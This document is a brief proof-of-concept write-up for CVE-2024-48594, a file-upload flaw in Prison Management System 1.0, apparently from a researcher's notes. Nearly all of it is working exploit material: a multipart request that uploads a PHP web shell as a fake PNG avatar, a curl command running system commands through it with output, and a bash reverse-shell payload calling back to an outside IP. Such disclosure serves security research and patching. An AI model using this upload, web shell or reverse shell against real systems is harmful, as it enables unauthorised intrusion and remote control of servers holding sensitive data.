# Prison Management System - CVE-2024-48594

## File Upload to RCE

PMS version `1.0` is affected by a file upload vulnerability ([CVE-2024-48594](https://x7331.gitbook.io/notes/)). This flaw allows a remote attacker to execute arbitrary code by uploading malicious files through the system's file upload functionality. Due to insufficient validation and filtering of uploaded files, attackers can bypass restrictions and introduce executable payloads such as web shells.

```http
# Request to POST /Admin/add-admin.php HTTP/1.1
------WebKitFormBoundaryyCVxsS8itKVeQYh3
Content-Disposition: form-data; name="txtusername"

test2
------WebKitFormBoundaryyCVxsS8itKVeQYh3
Content-Disposition: form-data; name="txtfullname"

test
------WebKitFormBoundaryyCVxsS8itKVeQYh3
Content-Disposition: form-data; name="txtpassword"

test
------WebKitFormBoundaryyCVxsS8itKVeQYh3
Content-Disposition: form-data; name="txtphone"

test
------WebKitFormBoundaryyCVxsS8itKVeQYh3
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: image/png

<?php system($_GET['c']);?>
------WebKitFormBoundaryyCVxsS8itKVeQYh3
Content-Disposition: form-data; name="btncreate"


------WebKitFormBoundaryyCVxsS8itKVeQYh3--
```

System commands can then be executed and/or upgrade the webshell to a reverse shell:

```bash
curl --path-as-is -s -k -b 'PHPSESSID=cduqalcr0v5v9b8jh9fjkb0c32' 'https://pms-instance:9443/uploadImage/Profile/webshell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Revshell payload (non URL-encoded)
?c=/usr/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.170/80 0>&1'
```
